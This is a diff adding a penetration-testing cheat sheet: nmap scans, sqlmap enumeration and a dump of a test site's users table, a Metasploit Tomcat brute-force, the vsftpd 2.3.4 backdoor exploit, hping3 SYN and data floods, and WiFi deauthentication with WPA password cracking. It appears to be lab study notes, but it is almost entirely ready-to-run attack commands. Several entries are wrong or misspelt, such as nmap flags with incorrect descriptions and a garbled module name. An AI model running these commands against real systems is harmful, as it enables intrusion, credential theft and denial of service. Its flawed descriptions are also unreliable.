@@ -1,0 +1,65 @@
+*****FOOT PRINTING AND RECCON
+
+> nmap 192.168.196.78
+> nmap -sP 192.168.196.76 (ping scan)
+> nmap -P 80 192.168.196.76 ( scan specific port /service)
+> nmap -sV 192.168.196.76 ( service version detection )
+> sudo nmap -A 192.168.196.76 (scan to detect firewall settings)
+> sudo nmap -sS 192.168.196.76 (TCP SYN scan)
+> sudo nmap -sU 192.168.196.76 (UDP scan)
+> sudo nmap -sA 192.168.196.76
+> sudo nmap -sT 192.168.196.76 ( To Identify hostname )
+
+
+******SQL INJECTION
+
+> sqlmap -u http://testphp.vulnweb.com/ --crawl 2 --batch (checking sql injection vulnerability of the site )
+> sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 --dbs ( to check database names in the particular site)
+> sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart --tables ( to check tables in the particular site)
+> sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1 -D acuart -T users --dump-all ( to dump all the tables in the particular database)
+> after getting the username and password try to login via site - succssfull
+
+******HACKING WEBSERVER (LINUX TOMACT)
+
+> msfconsole
+> nmap -sV 192.168.196.76 ( we will get all available ports,services,version
+> search tomcat
+> use auxiliary/scanner/http/tomcat_mrg_login
+> show options
+> set RHOSTS 192.168.196.76
+> set RPORT 8180
+> set BRUTEFORCE_SPEED 5
+> set STOP_ON_SUCCESS true
+> exploit or run
+ 
+******* FTP EXPLOITATION
+
+> ifconfig ( type in metasploitable to find its ip)
+> nmap -sV 192.168.176.96 (check for open ports,service,version)
+> msfconsole (start metasploite)
+> search vsftpd2.3.4
+> use exploit/unix/ftp/vsftp_234_bqckdoor
+> show options
+> set RHOSTS target ip address
+> run
+> ls 
+> Mkdir "rgniyd" ( folder is created )
+
+
+************ DENIAL OF SERVICE ATTACK
+
+> sudo hping3 -1 --faster 192.168.196.76 (100 pings per second)
+> sudo hping3 -S --flood -p 80 192.168.196.76 ( to send flood syc request to target website)
+> sudo hping3 --scan 1-65535 192.168.196.76 ( to scan all ports and reply the closed ports)
+> sudo hping3 192.168.196.76 --data 100000 (to send 100000 data packets)
+> sudo hping3 -S -d 5000 --flood 192.168.196.76 ( flood the data 5000)
+
+
+*************WIFI ATTACK
+
+> iwconfig ( shows name of wifi adapter)
+> airmon-ng start wlan0 ( enable monitor mod)
+> airodump-ng wlan0(to see all connected devices)
+> airodumb-ng -c 5 -w xyz --bssid <bSSID> wlan0 ( shows device connected in particular access point)
+> aireplay-ng --deauth 0 -a <BSSID> wlan0 ( to do deauthentication)
+> wireshark xyz.cap & aircrack-ng xyz.cap -w usr/share/wordlists/rockyou.txt ( bruteforce attack starts)
